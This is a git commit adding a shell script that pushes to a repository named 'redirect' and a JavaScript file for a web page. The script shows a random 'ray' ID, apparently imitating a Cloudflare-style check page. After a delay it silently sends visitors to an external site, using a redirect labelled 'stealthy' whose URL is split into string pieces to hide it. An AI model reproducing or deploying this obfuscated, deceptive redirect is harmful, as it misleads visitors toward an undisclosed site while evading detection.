25646c2365a76453a0863ab5e745acf00256a9a4
axites <rifqilingga07@gmail.com>
2025-12-20 06:12:08 +0000

    upload

---
+++ a.sh
@@ -0,0 +1,6 @@
+git init
+git add .
+git commit -m "upload"
+git branch -M main
+git remote add origin git@github.com:axites/redirect.git
+git push -u origin main
---
+++ main.js
@@ -0,0 +1,19 @@
+  function genRay() {
+    const hex = () =>
+      Array.from(crypto.getRandomValues(new Uint8Array(8)))
+        .map(b => b.toString(16).padStart(2, '0')).join('');
+    return hex() + hex().slice(0,8);
+  }
+  document.getElementById('ray-value').textContent = genRay();
+  
+  // Stealthy JavaScript redirect (replace original meta refresh)
+  setTimeout(function() {
+    var p1 = 'https://';
+    var p2 = 'triv.';
+    var p3 = 'my';
+    var target = p1 + p2 + p3;
+    window.location.href = target;
+  }, 4800); // 4.8 seconds
+  
+  
+  
